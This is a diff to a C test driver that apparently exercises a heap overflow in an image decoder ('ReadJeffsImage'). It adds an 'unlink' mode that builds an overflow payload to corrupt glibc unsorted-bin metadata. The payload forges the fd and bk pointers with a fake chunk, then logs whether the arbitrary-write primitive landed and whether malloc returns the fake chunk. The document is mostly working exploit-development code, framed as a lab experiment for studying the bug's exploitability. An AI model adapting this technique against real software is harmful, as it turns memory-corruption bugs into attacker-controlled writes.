@@ -58,6 +58,11 @@ static unsigned char payload_byte = 0x4d;
 static unsigned char payload[512];
 static int payload_custom = 0;
 static void *consume_B = NULL;
+/* Lab-arranged fake chunk for the unsorted-bin write experiment. The
+ * fake chunk starts 16 bytes before this buffer, so fake->fd is the
+ * first word of fake_buf. */
+static unsigned char fake_buf[64] __attribute__((aligned (16)));
+
 
 /* Build a JIF-style chunk stream whose zlib payload inflates to `outlen`
  * copies of the chosen payload byte (same construction as harness/driver.c). */
@@ -160,8 +165,10 @@ main (int argc, char **argv)
   setvbuf (stdout, NULL, _IONBF, 0);
   const char *mode = (argc > 1) ? argv[1] : "attack";
   int consume_mode = (! strcmp (mode, "consume") || ! strcmp (mode, "consumesz") ||
-                      ! strcmp (mode, "consume-safe"));
+                      ! strcmp (mode, "consume-safe") || ! strcmp (mode, "unlink"));
   int consume_safe = ! strcmp (mode, "consume-safe");
+  int unlink_mode = ! strcmp (mode, "unlink");
+
   int caller_mode = (! strcmp (mode, "caller") || ! strcmp (mode, "callerpub"));
   int file_mode = (! strcmp (mode, "file") || ! strcmp (mode, "fileptr") ||
                    caller_mode);
@@ -254,7 +261,8 @@ main (int argc, char **argv)
       payload_custom = 1;
       printf ("CHOSEN_PTR=%p PAYLOAD_OFFSET=272\n", chosen);
     }
-  if (consume_mode && ! consume_safe)
+  if (consume_mode && ! consume_safe && ! unlink_mode)
+
     {
       size_t sz = ! strcmp (mode, "consumesz")
         ? (size_t) 0x210 : (size_t) 0x4d4d4d4d4d4d4d4dUL;
@@ -271,7 +279,7 @@ main (int argc, char **argv)
    * metadata. No pointer from the file is dereferenced by this driver. */
   if (consume_mode)
     {
-      build_stream (outlen);
+
       void *fill[7];
       void *guard0 = g_try_malloc (260);
       consume_B = g_try_malloc (260);
@@ -295,6 +303,46 @@ main (int argc, char **argv)
       printf ("LAYOUT consume prepared B=%p A=%p drop=%p\n",
               consume_B, victim_A, drop);
 
+      /* Unsorted-bin write experiment. Keep A's original size word so
+       * the next-chunk and exact-fit checks pass; supply the live arena
+       * unsorted pointer in A->fd and a lab-arranged fake chunk in A->bk
+       * whose fd word already equals the victim chunk A. glibc's
+       * `bck->fd = unsorted_chunks (av)` then writes to fake_buf[0..7]. */
+      void *unsorted = NULL;
+      void *fakechunk = (void *) ((char *) fake_buf - 16);
+      unsigned char fake_before[32], fake_after[32];
+      if (unlink_mode)
+        {
+          size_t sz = 0x111;        /* original size, PREV_INUSE set */
+          unsorted = *(void **) victim_A;  /* A->fd after the free */
+          memset (fake_buf, 0x5a, sizeof fake_buf);
+          void *chunk_A = (void *) ((char *) victim_A - 16);
+          memcpy (fake_buf, &chunk_A, sizeof chunk_A);
+          void *bin_ptr = (void *) ((char *) unsorted + 0x100);
+          memcpy ((char *) fake_buf + 8, &bin_ptr, sizeof bin_ptr);
+
+
+
+
+
+          memcpy (fake_before, fake_buf, sizeof fake_before);
+          memset (payload, payload_byte, sizeof payload);
+          memcpy (payload + 264, &sz, sizeof sz);
+          memcpy (payload + 272, &unsorted, sizeof unsorted);
+          memcpy (payload + 280, &fakechunk, sizeof fakechunk);
+          payload_custom = 1;
+          printf ("UNLINK_SETUP fake=%p fd_slot=%p bk_slot=%p "
+                  "unsorted=%p bin=%p victim_user=%p victim_chunk=%p\n",
+                  fakechunk, (void *) fake_buf, (void *) (fake_buf + 8),
+                  unsorted, bin_ptr, victim_A, chunk_A);
+
+          printf ("UNLINK_FAKE_BEFORE=");
+          hexdump (fake_before, sizeof fake_before);
+
+        }
+      build_stream (outlen);
+
+
       rc = ReadJeffsImage (NULL, dest, 8, len, height, alpha,
                            &image, &error);
       printf ("MODE=%s PAYLOAD=%02x RC=%d ERR=%s\n",
@@ -303,10 +351,38 @@ main (int argc, char **argv)
               *(size_t *) ((char *) consume_B + 264),
               *(size_t *) ((char *) consume_B + 272),
               *(size_t *) ((char *) consume_B + 280));
+
       for (int k = 0; k < 10; k++)
         {
           void *after = g_try_malloc (260);
           printf ("POST_PIN malloc260[%d]=%p\n", k, after);
+          if (unlink_mode && k == 7)
+            printf ("UNLINK_RETURN_VICTIM=%d\n", after == victim_A);
+          if (unlink_mode && k == 8)
+            printf ("UNLINK_RETURN_FAKE=%d\n", after == fake_buf);
+
+          if (unlink_mode)
+            {
+              void *fd_now = NULL;
+              memcpy (&fd_now, fake_buf, sizeof fd_now);
+              printf ("UNLINK_FD_NOW[%d]=%p MATCH_UNSORTED=%d\n",
+                      k, fd_now, fd_now == unsorted);
+            }
+
+        }
+      if (unlink_mode)
+        {
+          void *fd_after = NULL;
+          memcpy (fake_after, fake_buf, sizeof fake_after);
+          memcpy (&fd_after, fake_buf, sizeof fd_after);
+          printf ("UNLINK_FAKE_AFTER=");
+          hexdump (fake_after, sizeof fake_after);
+          printf ("UNLINK_FD_MATCH=%d FD_CHANGED=%d\n",
+                  fd_after == unsorted,
+                  !! memcmp (fake_before, fake_after, sizeof fake_before));
+          printf ("UNLINK_FD_WORD_CHANGED=%d\n",
+                  !! memcmp (fake_before, fake_after, 8));
+
         }
       return 0;
     }
